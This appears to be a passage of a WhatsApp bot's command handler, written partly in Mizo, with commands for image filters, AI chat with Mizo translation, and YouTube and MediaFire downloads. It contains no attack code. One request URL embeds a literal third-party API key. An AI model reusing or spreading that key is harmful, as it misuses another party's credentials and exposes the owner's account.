let media = await HBWABotMz.downloadAndSaveMediaMessage(quoted)
let anu = await tourlup(media);
let tozombie = await fetchJson(`https://api.betabotz.eu.org/api/maker/jadizombie?url=${encodeURIComponent(anu)}&apikey=Btz-HlFgj`)
let heingei = tozombie.result
HBWABotMz.sendMessage(m.chat, { image: {url: heingei}, caption: `\n*©${global.botname}*`}, { quoted: m})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2)
await eco.deduct(limitneihtu, freevip, 1);
await finishreact()
}
break

case 'bgremove': case 'removebg': {
    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
    if (!quoted) return dodoi(`Thlalak rawn send/reply rawh`);
    if (!/image/.test(mime)) return dodoi(`Thlalak Send/Reply in a caption ah ${prefix + command} tih hi rawn dah rawh`);
    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) return await dailylimit();
    await loadingreact();
    let { clyrBg } = require("./lib/clyrBg")
    let media = await HBWABotMz.downloadAndSaveMediaMessage(quoted);
    let anu = await tourlup(media);
    let bgResult = await clyrBg.remove(anu, true);
    if (!bgResult.status) {
        return dodoi(`Failed to remove background: ${bgResult.result.error}`);
    }
    HBWABotMz.sendMessage(m.chat, { image: { url: bgResult.result.url }, caption: `\n*©${global.botname}*` }, { quoted: m });
    await eco.deduct(limitneihtu, kancoins, hmanzat);
    await eco.give(limitneihtu, kantitle, hmanzat2);
    await eco.deduct(limitneihtu, freevip, 1);
    await finishreact();
}
break;

case 'ghilibi': case 'toanime': case 'ghibili': case 'ghibli':{
    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
    if (!quoted) return dodoi(`Thlalak rawn send/reply rawh`);
    if (!/image/.test(mime)) return dodoi(`Thlalak Send/Reply in a caption ah ${prefix + command} tih hi rawn dah rawh`);
    const sizeopt = text.trim() || "1:1";
    const validSizes = ["1:1", "3:2", "2:3"];
    if (!validSizes.includes(sizeopt)) {
        return dodoi(`Size hi hetiang hian hman tur a ni\n*Entirnan*: ${prefix + command} 3:2\n\n🎯 *Options*\nSquare - 1:1 (1:1), Landscape - 3:2 (3:2), Portrait - 2:3 (2:3)`);
    }
    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) return await dailylimit();
    await loadingreact();
    const { ghibliGenerator } = require("./lib/ghilibi");
    await dodoi(`Minute 2/3 vel min lo nghak rawh`);
    const media = await HBWABotMz.downloadAndSaveMediaMessage(quoted);
    const result = await ghibliGenerator.generate(media, {
        prompt: "restyle image in studio ghibli style, keep all details",
        size: sizeopt
    });
    if (!result?.status) {
        return dodoi(`Ghibli generate failed: ${result.result?.error || 'unknown error'}`);
    }
    HBWABotMz.sendMessage(m.chat, { image: { url: result.result.url }, caption: `\n*©${global.botname}*` }, { quoted: m });
    await eco.deduct(limitneihtu, kancoins, hmanzat);
    await eco.give(limitneihtu, kantitle, hmanzat2);
    await eco.deduct(limitneihtu, freevip, 1);
    await finishreact();
}
break;

case 'ai':
case 'openai': {
    if (!text) return dodoi(`_🤖 Ai nen a in biakna Tiang hian i hmang ang_\n*⟨Entirnan:* ${prefix + command} ChatGpt hi eng nge a nih min hrilh fiah thei em?.`);
    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) return await dailylimit();
    await robotreact();
    const source1 = 'lus';
    const target1 = 'en';
    const athu1 = text.replace(/Tunge siam che|Tuin nge siam che/g, `Who created you`);    
    const mizotranslation1 = await mizo_tawnga_translate_na.translate(source1, target1, athu1);

    try {
        const response = await cfAI.ask({
            modelId: 1, // Using LLaMA 3.1 8B
            messages: [
                {
                    role: "assistant",
                    content: BossHerbert
                },
                {
                    role: "user",
                    content: mizotranslation1
                }
            ]
        });

        if (response.result?.response) {
            let chutin = response.result.response;

            const source2 = 'auto';
            const target2 = chutin.includes('```') ? 'en' : 'lus';
            const athu2 = chutin;

            const mizotranslation2 = await mizo_tawnga_translate_na.translate(source2, target2, athu2);

            const finalReply = mizotranslation2
                .replace(/ka siamtu|ka neitu/g, 'min siamtu')
                .replace(/Ka neitu|Ka siamtu/g, 'Min siamtu')
                .replace(/Chibai! /g, `Hello ${pushname}, `)
                .replace(/I tanpui turin ka|tanpui turin ka/g, 'tanpui tur chein ka')
                .replace(/ka rawn kal a ni/g, 'ka awm e')
                .replace(/hi hi! Ah/g, `Hello ${pushname} `)
                .replace(/😊 AH,/g, ``)
                .replace(/Ka ngaidam che u|Ka ngaidam che|Ngaidam rawh|Ngaidam rawh u/g, 'Ka tihpalh')
                .replace(/Hello! 👋 How can I assist you today?/g, `Hello ${pushname} 👋, Vawiin hian engtin nge ka puih thei ang che`);

            await HBWABotMz.sendPresenceUpdate('composing', m.chat);
            await dodoi(finalReply);
            await eco.deduct(limitneihtu, kancoins, hmanzat);
            await eco.give(limitneihtu, kantitle, hmanzat2)
        } else {
            throw new Error("AI response failed");
        }
    } catch (error) {
        await dodoi(`_❌ AI fetch error: ${error.message}_`);
    }

    break;
}
case 'ai2':
case 'gpt': {
    if (!text) return dodoi(`_🤖 Ai nen a in biakna Tiang hian i hmang ang_\n*⟨Entirnan:* ${prefix + command} ChatGpt hi eng nge a nih min hrilh fiah thei em?.`);
    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) return await dailylimit();
    await robotreact();
    const source1 = 'lus';
    const target1 = 'en';
    const athu1 = text.replace(/Tunge siam che|Tuin nge siam che/g, `Who created you`);    
    const mizotranslation1 = await mizo_tawnga_translate_na.translate(source1, target1, athu1);

    try {
        const response = await cfAI.ask({
            modelId: 1, // Using LLaMA 3.1 8B
            messages: [
                {
                    role: "assistant",
                    content: BossHerbert
                },
                {
                    role: "user",
                    content: mizotranslation1
                }
            ]
        });

        if (response.result?.response) {
            let chutin = response.result.response;

            const source2 = 'auto';
            const target2 = chutin.includes('```') ? 'en' : 'en';
            const athu2 = chutin;

            const mizotranslation2 = await mizo_tawnga_translate_na.translate(source2, target2, athu2);

            const finalReply = mizotranslation2
                .replace(/ka siamtu|ka neitu/g, 'min siamtu')
                .replace(/Ka neitu|Ka siamtu/g, 'Min siamtu')
                .replace(/Chibai! /g, `Hello ${pushname}, `)
                .replace(/I tanpui turin ka|tanpui turin ka/g, 'tanpui tur chein ka')
                .replace(/ka rawn kal a ni/g, 'ka awm e')
                .replace(/Ka ngaidam che u|Ka ngaidam che|Ngaidam rawh|Ngaidam rawh u/g, 'Ka tihpalh')
                .replace(/Hello! 👋 How can I assist you today?/g, `Hello ${pushname} 👋, Vawiin hian engtin nge ka puih thei ang che`);

            await HBWABotMz.sendPresenceUpdate('composing', m.chat);
            await dodoi(finalReply);
            await eco.deduct(limitneihtu, kancoins, hmanzat);
            await eco.give(limitneihtu, kantitle, hmanzat2)
        } else {
            throw new Error("AI response failed");
        }
    } catch (error) {
        await dodoi(`_❌ AI fetch error: ${error.message}_`);
    }

    break;
}
case 'deepseek':
case 'deepai': {
    if (!text) return dodoi(`_🤖 Ai nen a in biakna Tiang hian i hmang ang_\n*⟨Entirnan:* ${prefix + command} ChatGpt hi eng nge a nih min hrilh fiah thei em?.`);
    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) return await dailylimit();
    await robotreact();
    const source1 = 'lus';
    const target1 = 'en';
    const athu1 = text.replace(/Tunge siam che|Tuin nge siam che/g, `Who created you`);    
    const mizotranslation1 = await mizo_tawnga_translate_na.translate(source1, target1, athu1);

    try {
        const response = await cfAI.ask({
            modelId: 2,
            messages: [
                {
                    role: "user",
                    content: mizotranslation1
                }
            ]
        });

        if (response.result?.response) {
            let chutin = response.result.response;

            const source2 = 'auto';
            const target2 = chutin.includes('```') ? 'en' : 'lus';
            const athu2 = chutin;

            const mizotranslation2 = await mizo_tawnga_translate_na.translate(source2, target2, athu2);

            const finalReply = mizotranslation2
                .replace(/ka siamtu|ka neitu/g, 'min siamtu')
                .replace(/Ka neitu|Ka siamtu/g, 'Min siamtu')
                .replace(/Chibai! /g, `Hello ${pushname}, `)
                .replace(/I tanpui turin ka|tanpui turin ka/g, 'tanpui tur chein ka')
                .replace(/ka rawn kal a ni/g, 'ka awm e')
                .replace(/Ka ngaidam che u|Ka ngaidam che|Ngaidam rawh|Ngaidam rawh u/g, 'Ka tihpalh')
                .replace(/Hello! 👋 How can I assist you today?/g, `Hello ${pushname} 👋, Vawiin hian engtin nge ka puih thei ang che`);

            await HBWABotMz.sendPresenceUpdate('composing', m.chat);
            await dodoi(finalReply);
            await eco.deduct(limitneihtu, kancoins, hmanzat);
            await eco.give(limitneihtu, kantitle, hmanzat2)
        } else {
            throw new Error("AI response failed");
        }
    } catch (error) {
        await dodoi(`_❌ AI fetch error: ${error.message}_`);
    }

    break;
}
case 'ayesoul': {
    if (!text && !quoted) return dodoi(`_🤖 Ai nen a in biakna Tiang hian i hmang ang_\n*⟨Entirnan:* ${prefix + command} ChatGpt hi eng nge a nih min hrilh fiah thei em?.`);

    const { ayesoul } = require('./lib/ayesoul');
    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) return await dailylimit();

    await robotreact();

    try {
        const mime = (quoted?.msg || m.quoted)?.mimetype || '';
        const isImage = /image/.test(mime);
        let responsePromise;

        // **Translate Mizo to English before processing**
        const translatedText = text ? await mizo_tawnga_translate_na.translate('lus', 'en', text) : null;

        if (isImage) {
            await loadingreact();

            let media = await HBWABotMz.downloadAndSaveMediaMessage(quoted);
            let visionPromise = ayesoul.vision(media);

            // **Send text response while processing the image**
            if (text) responsePromise = ayesoul.chat(translatedText);

            let visionResponse = await visionPromise;
            if (!visionResponse.status) {
                if (fs.existsSync(media)) fs.unlinkSync(media);
                return dodoi(`❌ Image processing failed: ${visionResponse.result.error}`);
            }

            responsePromise = visionResponse;

            if (fs.existsSync(media)) fs.unlinkSync(media);
        } else if (text.toLowerCase().startsWith('genimage')) {
            // **AI Image Generation**
            const prompt = translatedText.replace(/^genimage\s*/i, '');
            responsePromise = ayesoul.genimage(prompt);
        } else {
            // **AI Chat**
            responsePromise = ayesoul.chat(translatedText);
        }

        let response = await responsePromise;

        if (response?.status) {
            const result = response.result;

            // **Translate AI response back to Mizo**
            const translatedResponse = await mizo_tawnga_translate_na.translate('auto', 'lus', result.message);

            let finalReply = translatedResponse
                .replace(/ka siamtu|ka neitu/g, 'min siamtu')
                .replace(/Ka neitu|Ka siamtu/g, 'Min siamtu')
                .replace(/Chibai! /g, `Hello ${pushname}, `)
                .replace(/I tanpui turin ka|tanpui turin ka/g, 'tanpui tur chein ka')
                .replace(/ka rawn kal a ni/g, 'ka awm e')
                .replace(/hi hi! Ah/g, `Hello ${pushname} `)
                .replace(/😊 AH,/g, ``)
                .replace(/Ka ngaidam che u|Ka ngaidam che|Ngaidam rawh|Ngaidam rawh u/g, 'Ka tihpalh')
                .replace(/Hello! 👋 How can I assist you today?/g, `Hello ${pushname} 👋, Vawiin hian engtin nge ka puih thei ang che`);

            if (result.type === 'genimage' && result.images.length > 0) {
                const caption = result.message ? `${translatedResponse}` : `\n*©${global.botname}*`;
                await HBWABotMz.sendMessage(m.chat, { image: { url: result.images[0] }, caption }, { quoted: m });
            } else if (result.type === 'vision') {
                return dodoi2(`${translatedResponse}`);
            } else {
                await dodoi(finalReply);
            }

            await eco.deduct(limitneihtu, kancoins, hmanzat);
            await eco.give(limitneihtu, kantitle, hmanzat2);
        } else {
            throw new Error(response.result?.error || "Unknown error");
        }
    } catch (error) {
        await dodoi(`_❌ AI fetch error: ${error.message}_`);
    }

    break;
}

case 'gimage': {

                if (!text) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} Mizoram`)
                await loadingreact()
                let gis = require('g-i-s')
                gis(text, async (error, result) => {
  n = result
  images = n[Math.floor(Math.random() * n.length)].url
  HBWABotMz.sendMessage(m.chat, { image: { url: images}, caption: `*-------「 GIMAGE SEARCH 」-------*\n🤠 *Query* : ${text}\n🔗 *Media Url* : ${images}`}, { quoted: m })
  
                })
            }
        break

case 'mediafire': {

if (args.length == 0) return dodoi2(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} https://www.mediafire.com/file/tjssf24bfa0pqh6/Insta+v9.70.apk/file`)
const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return dodoi(`I link rawn dah hi a dik lo!..`)
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
const { mediafireDl } = require('./lib/mediafire.js')
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 100) return dodoi('A file size a lian lutuk...')
const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].hming}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}`;
HBWABotMz.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].hming, mimetype: baby1[0].mime, caption : result4}, { quoted : m })
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break
case 'mlstalk':
{
if (!q || !q.includes("|")) {
return dodoi2(`${mtl2.guide1}\n*⟨Entirnan:* ${prefix + command} 530793138|8129 \n͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏\nserver id rawn dah tel ang che!..`)
}
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
if (!dat || Object.keys(dat).length === 0) {
return dodoi("I id emaw service id hi a dik lo a ni mai thei.")
}
var MlLoading = [
`《▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《█▒▒▒▒▒▒▒▒▒▒▒》10%`,
`《████▒▒▒▒▒▒▒▒》30%`,
`《███████▒▒▒▒▒》50%`,
`《██████████▒▒》80%`,
`《████████████》100%`,
`*⟨⟨⟨Mobile Legend Stalker⟩⟩⟩*\n\nUsername : ${dat.userName}\nId : ${q.split("|")[0]}\nID Zone: ${q.split("|")[1]}`]
let { key } = await HBWABotMz.sendMessage(from, {text: '《▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'},{quoted:m})

for (let i = 0; i < MlLoading.length; i++) {await HBWABotMz.sendMessage(from, {text: MlLoading[i], edit: key },{quoted:m})}
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);await eco.give(limitneihtu, kantitle, hmanzat2);}
break

case 'dsong': case 'song': case 'play': {
if (!args || !args[0]) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} https://youtube.com/watch?v=DA9gCKwaefg`);
const freevip = "frvip2";
const limit24 = await eco.balance(limitneihtu, freevip);
if (!isVip && limit24.wallet < 1) return await replyvip();
if (isExp && limit24.wallet < 1) return replyvipexp();
const limit1 = await eco.balance(limitneihtu, kancoins);
if (hmanzat > limit1.wallet) return await dailylimit();
await loadingreact();
let res = await yts(text);
let vid = res.videos[0];
let v = vid.url;
const vidIdMatch = v.match(/(?:youtu\.be\/|youtube\.com\/(?:.*[?&]v=|embed\/|shorts\/|v\/))([\w-]{11})/);
const vidId = vidIdMatch ? vidIdMatch[1] : null;
let search = await yts({ videoId: vidId, hl: 'id', gl: 'ID' });
if (!search) return dodoi(`*Video hmuh tur a awm lo!* ☹️`);
let { videoId, image, title, views, duration, author, ago, url, description } = res.all[0];
let caption = `*${title}*
╭═══════════
*⚙️Duration:* ${duration}
*⚙️Upload:* ${ago}
*⚙️Description:* ${description}
*⚙️Channel:* ${author.name}
╰════════════`;
await uploadreact();
if (isBusiness) {
    let q = 'mp3'; 
    let result;
    try {
        result = await SaveTube(v, q);
        if (!result.status) throw new Error(result.error);
    } catch (error) {
        console.warn("[SaveTube] Failed, falling back to amdl");

        try {
            result = await amdl.download(v, q);
            if (!result.status) throw new Error(result.result.error);
        } catch (amdlError) {
            return dodoi(`Error fetching audio: ${amdlError.message}`);
        }
    }
    const { download } = result.result;
    await HBWABotMz.sendMessage(m.chat, {
        document: { url: download }, 
        mimetype: 'audio/mpeg',
        fileName: `${title}.mp3`,
        contextInfo: {
            externalAdReply: { 
                showAdAttribution: true,
                containsAutoReply: true,
                renderLargerThumbnail: true,
                title: title,
                thumbnail: {url : image},
                mediaType: 1,
                mediaUrl: v,
                sourceUrl: v
            }
        }
    }, { quoted: m });
    await eco.deduct(limitneihtu, freevip, 1);
    await eco.deduct(limitneihtu, kancoins, hmanzat);
    await eco.give(limitneihtu, kantitle, hmanzat2);
    await finishreact();
    return;
}
HBWABotMz.sendMessage(m.chat, {
    image: { url: image },
    caption,
    mentions: [m.sender],
    footer: botname,
    buttons: [{
        buttonId: `${prefix}ytaudio ${v}`,
        buttonText: { displayText: "Audio" }
    }, {
        buttonId: `${prefix}ytmp3 ${v}`,
        buttonText: { displayText: "Document" }
    }],
    viewOnce: true,
    headerType: 6,
}, { quoted: m });
await eco.deduct(limitneihtu, freevip, 1);
await eco.deduct(limitneihtu, kancoins, hmanzat);
await eco.give(limitneihtu, kantitle, hmanzat2);
await finishreact();
}
break;

case 'ytmp4': {
    if (!args || !args[0]) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} https://youtube.com/watch?v=DA9gCKwaefg`);

    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);

/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */

    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) return await dailylimit();

    await loadingreact();

    if (!args[0].match(/youtu/gi)) return dodoi('Youtube link dik tak chauh rawn dah rawh');

    let v = args[0]; 
    let q = args[1] || '720p'; 
    let result;
    try {
        result = await SaveTube(v, q.replace('p', ''));
        if (!result.status) throw new Error(result.error);
    } catch (error) {
        console.warn("[SaveTube] Failed, amdl ah thlak a ni");

        try {
            result = await amdl.download(v, q);
            if (!result.status) throw new Error(result.result.error);
        } catch (amdlError) {
            return dodoi(`Video laknaah error a awm: ${amdlError.message}`);
        }
    }
    const { title, download, format, thumbnail, quality } = result.result;
    const ytc = `*${title}*
╭═══════════
*⚙️File type :* mp4
*⚙️Quality :* ${quality}p
*⚙️Size :* Unknown
*⚙️By ${global.botname}*
╰════════════`;

    await eco.deduct(limitneihtu, kancoins, hmanzat);
    await eco.give(limitneihtu, kantitle, hmanzat2);

    await uploadreact();

    await HBWABotMz.sendMessage(m.chat, {
        video: { url: download },
        caption: ytc
    }, { quoted: m });

    await finishreact();
}
break;

case 'ytmp3': {
    if (!args || !args[0]) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} https://youtube.com/watch?v=DA9gCKwaefg`);

    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);

/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */

    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) return await dailylimit();
    await loadingreact();
    if (!args[0].match(/youtu/gi)) return dodoi('Youtube link dik tak chauh rawn dah rawh');

    let v = args[0];
    let q = 'mp3'; 
    let result;
    try {
        result = await SaveTube(v, q);
        if (!result.status) throw new Error(result.error);
    } catch (error) {
        console.warn("[SaveTube] Failed, amdl ah thlak a ni");

        try {
            result = await amdl.download(v, q);
            if (!result.status) throw new Error(result.result.error);
        } catch (amdlError) {
            return dodoi(`Audio laknaah error a awm:  ${amdlError.message}`);
        }
    }
    const { title, download, format, thumbnail, quality } = result.result;
    const ytc = `*${title}*
╭═══════════
*⚙️File type :* mp3
*⚙️Bitrate :* ${quality}kbps
*⚙️By ${global.botname}*
╰════════════`;

    await eco.deduct(limitneihtu, kancoins, hmanzat);
    await eco.give(limitneihtu, kantitle, hmanzat2);

    await uploadreact();

    await HBWABotMz.sendMessage(m.chat, {
        document: { url: download },
        fileName: `${title}.mp3`,
        mimetype: 'audio/mp4',
        caption: ytc
    }, { quoted: m });

    await finishreact();
}
break;

case  'ytaudio': {
if (!args || !args[0]) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} https://youtube.com/watch?v=DA9gCKwaefg`)
const freevip = "frvip2";
const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
await loadingreact()
let v = args[0];
    let q = 'mp3'; 
    let result;
    try {
        result = await SaveTube(v, q);
        if (!result.status) throw new Error(result.error);
    } catch (error) {
        console.warn("[SaveTube] Failed, amdl ah thlak a ni");

        try {
            result = await amdl.download(v, q);
            if (!result.status) throw new Error(result.result.error);
        } catch (amdlError) {
            return dodoi(`Audio laknaah error a awm:  ${amdlError.message}`);
        }
    }
    const { title, download, format, thumbnail, quality } = result.result;
		await uploadreact()
					await HBWABotMz.sendMessage(m.chat, { 
						audio: { url: download }, 
						mimetype: 'audio/mpeg',
						fileName: `${title}.mp3`,
					}, { quoted: m });
await eco.deduct(limitneihtu, freevip, 1);
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);
		await finishreact()
				break;
			}
case 'song2': case 'play2': {
//Credit by HBMods-OFC
if (!args || !args[0]) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} https://youtube.com/watch?v=DA9gCKwaefg`)
const freevip = "frvip2";
const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
await loadingreact()
let res = await yts(text)
let vid = res.videos[0]
let v = vid.url
let { image } = res.all[0];
    let q = 'mp3'; 
    let result;
    try {
        result = await SaveTube(v, q);
        if (!result.status) throw new Error(result.error);
    } catch (error) {
        console.warn("[SaveTube] Failed, amdl ah thlak a ni");

        try {
            result = await amdl.download(v, q);
            if (!result.status) throw new Error(result.result.error);
        } catch (amdlError) {
            return dodoi(`Audio laknaah error a awm:  ${amdlError.message}`);
        }
    }
    const { title, download, format, thumbnail, quality } = result.result;
    await uploadreact()
await HBWABotMz.sendMessage(m.chat, { 
	  audio: { url : download }, 
      mimetype: 'audio/mpeg',
	  fileName: `${title}.mp3`,
	  contextInfo:{
          externalAdReply:{ 
          showAdAttribution: true,
          containsAutoReply: true,
          renderLargerThumbnail: true,
          title: `${title}`,
          thumbnail : {url : image},
          mediaType: 1,
          mediaUrl: `${vid.url}`,
          sourceUrl: `${vid.url}`
}
}
}, { quoted: m });
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);await finishreact()
}
break
case 'dvid': case 'dvideo': {
    if (!args || !args[0]) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} https://youtube.com/watch?v=DA9gCKwaefg`);
    
    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
    
    if (!isVip && limit24.wallet < 1) return await replyvip();
    if (isExp && limit24.wallet < 1) return replyvipexp();

    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) return await dailylimit();

    await loadingreact();

    let res = await yts(args[0]); // Search YouTube video
    if (!res.videos.length) return dodoi('No video found for your search query');

    let vid = res.videos[0];
    let v = vid.url; // YouTube Video URL
    let requestedQuality = args[1] ? args[1].replace('p', '') : '720'; // Remove 'p' and set default to '720'

    // Check if the requested quality is valid
    const availableQualities = ['144', '240', '360', '480', '720', '1080', 'mp3'];
    let q = availableQualities.includes(requestedQuality) ? requestedQuality : '360'; // Default to 360p if invalid

    let result;

    // Try SaveTube first
    try {
        result = await SaveTube(v, q);
        if (!result.status) throw new Error(result.error);
    } catch (error) {
        console.warn("[SaveTube] Failed, switching to AMDL...");

        try {
            result = await amdl.download(v, q);
            if (!result.status) throw new Error(result.result.error);
        } catch (amdlError) {
            return dodoi(`Video laknaah error a awm: ${amdlError.message}`);
        }
    }

    const { title, download, format, thumbnail, quality } = result.result;

    await uploadreact();
    
    await HBWABotMz.sendMessage(m.chat, {
        video: { url: download },
        mimetype: 'video/mp4',
        caption: `*${title}*
╭═══════════
*⚙️File type :* mp4
*⚙️Quality :* ${quality}p
*⚙️By ${global.botname}*
╰════════════`
    }, { quoted: m });

